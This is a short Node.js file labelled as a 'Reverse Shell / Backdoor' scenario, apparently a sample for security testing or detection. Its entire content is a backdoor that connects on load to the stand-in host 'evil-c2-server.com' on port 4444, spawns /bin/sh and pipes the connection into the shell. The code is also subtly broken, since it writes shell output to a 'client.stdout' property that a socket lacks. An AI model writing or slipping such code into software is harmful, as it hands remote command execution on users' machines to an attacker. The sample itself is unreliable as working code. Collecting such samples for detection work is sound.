// Scenario: Reverse Shell / Backdoor
import { spawn } from 'child_process';
import net from 'net';

function establishPersistence() {
  const client = new net.Socket();
  client.connect(4444, 'evil-c2-server.com', function () {
    const sh = spawn('/bin/sh', []);
    client.pipe(sh.stdin);
    sh.stdout.pipe(client.stdout);
    sh.stderr.pipe(client.stderr);
  });
}

establishPersistence();
